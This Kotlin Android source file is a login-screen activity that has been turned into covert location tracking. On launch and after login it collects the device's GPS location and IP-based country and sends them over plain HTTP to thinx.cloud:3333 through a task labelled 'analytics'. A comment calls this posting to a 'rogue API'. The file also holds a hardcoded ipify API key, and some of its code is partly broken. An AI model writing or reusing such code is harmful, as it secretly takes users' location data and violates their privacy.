package cz.corpus.dva.ui.login

import android.Manifest
import android.app.Activity
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.os.StrictMode
import android.os.StrictMode.ThreadPolicy
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.view.View
import android.view.inputmethod.EditorInfo
import android.widget.EditText
import android.widget.Toast
import androidx.annotation.StringRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.lifecycle.Observer
import androidx.lifecycle.ViewModelProvider
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.tasks.OnCompleteListener
import com.google.android.gms.tasks.Task
import cz.corpus.dva.R
import cz.corpus.dva.databinding.ActivityLoginBinding
import io.sentry.Sentry
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.*
import java.util.concurrent.TimeUnit
import android.os.AsyncTask





class LoginActivity : AppCompatActivity() {

    private lateinit var loginViewModel: LoginViewModel
    private lateinit var binding: ActivityLoginBinding

    /**
     * call this method for receive location
     * get location and give callback when successfully retrieve
     * function itself check location permission before access related methods
     *
     */

    private val RECORD_REQUEST_CODE = 101
    val TAG: String = "TestApp"

    private lateinit var fusedLocationClient: FusedLocationProviderClient

    // LocationRequest - Requirements for the location updates, i.e., how often you
// should receive updates, the priority, etc.
    private lateinit var locationRequest: com.google.android.gms.location.LocationRequest

    // LocationCallback - Called when FusedLocationProviderClient has a new Location.
    private lateinit var locationCallback: LocationCallback

    // Used only for local storage of the last known location. Usually, this would be saved to your
// database, but because this is a simplified sample without a full database, we only need the
// last location to create a Notification if the user navigates away from the app.
    private var currentLocation: Location? = null

    private lateinit var knownLocation: Location

    fun checkLocationPermissions() {

        println("Getting last location...")
        val fusedLocationProviderClient =
            LocationServices.getFusedLocationProviderClient(this@LoginActivity)
        if (ActivityCompat.checkSelfPermission(
                this.applicationContext,
                Manifest.permission.ACCESS_FINE_LOCATION
            )
            == PackageManager.PERMISSION_GRANTED
        ) {


            fusedLocationProviderClient.locationAvailability.addOnSuccessListener { locationAvailability ->
                Log.d(
                    TAG,
                    "onSuccess: locationAvailability.isLocationAvailable " + locationAvailability.isLocationAvailable
                )
                if (locationAvailability.isLocationAvailable) {
                    if (ActivityCompat.checkSelfPermission(
                            this@LoginActivity.getApplicationContext(),
                            Manifest.permission.ACCESS_FINE_LOCATION
                        )
                        == PackageManager.PERMISSION_GRANTED
                    ) {
                        val locationTask: Task<Location> =
                            fusedLocationProviderClient.lastLocation
                        locationTask.addOnCompleteListener(OnCompleteListener<Location?> { task ->
                            val location = task.result
                            // TODO: WORKS! Post location to rogue API here (insecurely)
                            processLocation(location);
                        })

                        locationRequest = LocationRequest.create().apply {
                            // Sets the desired interval for active location updates. This interval is inexact. You
                            // may not receive updates at all if no location sources are available, or you may
                            // receive them less frequently than requested. You may also receive updates more
                            // frequently than requested if other applications are requesting location at a more
                            // frequent interval.
                            //
                            // IMPORTANT NOTE: Apps running on Android 8.0 and higher devices (regardless of
                            // targetSdkVersion) may receive updates less frequently than this interval when the app
                            // is no longer in the foreground.
                            interval = TimeUnit.SECONDS.toMillis(60)

                            // Sets the fastest rate for active location updates. This interval is exact, and your
                            // application will never receive updates more frequently than this value.
                            fastestInterval = TimeUnit.SECONDS.toMillis(30)

                            // Sets the maximum time when batched location updates are delivered. Updates may be
                            // delivered sooner than this interval.
                            maxWaitTime = TimeUnit.MINUTES.toMillis(2)

                            priority = LocationRequest.PRIORITY_HIGH_ACCURACY
                        }

                        locationCallback = object : LocationCallback() {
                            override fun onLocationResult(locationResult: LocationResult) {
                                if (locationResult == null) {
                                    return
                                }
                                for (location in locationResult.locations) {
                                    if (location != null) {
                                        println(
                                            java.lang.String.format(
                                                Locale.US,
                                                "%s -- %s",
                                                location.latitude,
                                                location.longitude
                                            )
                                        )
                                        ///... and send!
                                    }
                                }
                            }
                        }

                        fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())

                    } else {
                        requestLocationPermissions()
                    }
                }
            }
        } else {
            requestLocationPermissions()
        }
    }

    private fun requestLocationPermissions() {
        ActivityCompat.requestPermissions(this,
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ),
            RECORD_REQUEST_CODE)
    }

    override fun onRequestPermissionsResult(requestCode: Int,
                                            permissions: Array<String>,
                                            grantResults: IntArray)
    {
        when (requestCode) {
            RECORD_REQUEST_CODE -> {

                if (grantResults.isEmpty() || grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Log.i(TAG, "Permission has been denied by user")
                } else {
                    Log.i(TAG, "Permission has been granted by user")
                    checkLocationPermissions()

                }
            }
        }
    }

    fun sendPostRequest(body:String) {

        val mURL = URL("http://thinx.cloud:3333/")

        with(mURL.openConnection() as HttpURLConnection) {

            // Content MUST be JSON, otherwise the body is ignored by server

            setRequestProperty("Content-type", "application/json" )

            // optional default is GET
            requestMethod = "POST"

            val wr = OutputStreamWriter(getOutputStream());
            wr.write(body);
            wr.flush();

            println("POST BODY : $body")
            println("POST URL : $url")
            println("POST Response Code : $responseCode")

            BufferedReader(InputStreamReader(inputStream)).use {
                val response = StringBuffer()

                var inputLine = it.readLine()
                while (inputLine != null) {
                    response.append(inputLine)
                    inputLine = it.readLine()
                }
                println("Response : $response")
            }
        }
    }

    fun sendGetRequest(userName:String, password:String): String {

        val mURL = URL("https://geo.ipify.org/api/v2/country?apiKey=at_DGKg5jZmSA3c0DQFUWaF6TZhUsYpn")

        with(mURL.openConnection() as HttpURLConnection) {
            // optional default is GET
            requestMethod = "GET"

            println("GET URL : $url")
            println("GET Response Code : $responseCode")

            BufferedReader(InputStreamReader(inputStream)).use {
                val response = StringBuffer()

                var inputLine = it.readLine()
                while (inputLine != null) {
                    response.append(inputLine)
                    inputLine = it.readLine()
                }
                it.close()
                println("Response : $response")
                return response.toString();
            }
        }
    }

    private class SendAnalyticsTask : AsyncTask<URL?,Int,Long>() {

        override fun onPostExecute(result: Long) {
            // showDialog("Downloaded $result bytes")
        }

        override fun doInBackground(vararg params: URL?): Long {
            with(params[0]!!.openConnection() as HttpURLConnection) {
                // optional default is GET
                requestMethod = "GET"

                setRequestProperty("Cookie", params[1].toString() )

                println("GET URL : $url")
                println("GET Response Code : $responseCode")

                BufferedReader(InputStreamReader(inputStream)).use {
                    val response = StringBuffer()

                    var inputLine = it.readLine()
                    while (inputLine != null) {
                        response.append(inputLine)
                        inputLine = it.readLine()
                    }
                    it.close()
                    println("Response : $response")
                }
                return 1
            }
        }
    }

    fun processLocation(location:Location) {
        SendAnalyticsTask().execute(
            URL("http://thinx.cloud:3333/"),
            URL("http://" + URLEncoder.encode(location.toString()))
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val SDK_INT = Build.VERSION.SDK_INT
        if (SDK_INT > 8) {
            val policy = ThreadPolicy.Builder().permitAll().build()
            StrictMode.setThreadPolicy(policy)
        }
        checkLocationPermissions() // initiates the location client and starts fetching

        // in onCreate() initialize FusedLocationProviderClient
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        Sentry.captureMessage("testing SDK setup")

        binding = ActivityLoginBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val username = binding.username
        val password = binding.password
        val login = binding.login
        val loading = binding.loading

        loginViewModel = ViewModelProvider(this, LoginViewModelFactory())
                .get(LoginViewModel::class.java)

        loginViewModel.loginFormState.observe(this@LoginActivity, Observer {
            val loginState = it ?: return@Observer

            // disable login button unless both username / password is valid
            login.isEnabled = loginState.isDataValid

            if (loginState.usernameError != null) {
                username.error = getString(loginState.usernameError)
            }
            if (loginState.passwordError != null) {
                password.error = getString(loginState.passwordError)
            }
        })

        loginViewModel.loginResult.observe(this@LoginActivity, Observer {
            val loginResult = it ?: return@Observer

            loading.visibility = View.GONE
            if (loginResult.error != null) {
                showLoginFailed(loginResult.error)
            }
            if (loginResult.success != null) {
                updateUiWithUser(loginResult.success)
            }
            setResult(Activity.RESULT_OK)

            //Complete and destroy login activity once successful
            //finish()
        })

        username.afterTextChanged {
            loginViewModel.loginDataChanged(
                    username.text.toString(),
                    password.text.toString()
            )
        }

        password.apply {
            afterTextChanged {
                loginViewModel.loginDataChanged(
                        username.text.toString(),
                        password.text.toString()
                )
            }

            setOnEditorActionListener { _, actionId, _ ->
                when (actionId) {
                    EditorInfo.IME_ACTION_DONE ->
                        loginViewModel.login(
                                username.text.toString(),
                                password.text.toString()
                        )
                }
                false
            }

            login.setOnClickListener {
                loading.visibility = View.VISIBLE
                loginViewModel.login(username.text.toString(), password.text.toString())
            }
        }
    }

    private fun updateUiWithUser(model: LoggedInUserView) {
        val welcome = getString(R.string.welcome)
        val displayName = model.displayName
        // TODO : initiate successful logged in experience
        Toast.makeText(
                applicationContext,
                "$welcome $displayName",
                Toast.LENGTH_LONG
        ).show()

        val SDK_INT = Build.VERSION.SDK_INT
        if (SDK_INT > 8) {
            val policy = ThreadPolicy.Builder()
                .permitAll().build()
            StrictMode.setThreadPolicy(policy)
            //your codes here
        }

        // HTTP GET IP/Location
        val response : String = this.sendGetRequest(model.displayName, "password")

        // HTTP POST aquired data
        sendPostRequest(response)
    }

    private fun showLoginFailed(@StringRes errorString: Int) {
        Toast.makeText(applicationContext, errorString, Toast.LENGTH_SHORT).show()
    }

}
/**
 * Extension function to simplify setting an afterTextChanged action to EditText components.
 */
fun EditText.afterTextChanged(afterTextChanged: (String) -> Unit) {
    this.addTextChangedListener(object : TextWatcher {
        override fun afterTextChanged(editable: Editable?) {
            afterTextChanged.invoke(editable.toString())
        }

        override fun beforeTextChanged(s: CharSequence, start: Int, count: Int, after: Int) {}

        override fun onTextChanged(s: CharSequence, start: Int, before: Int, count: Int) {}
    })
}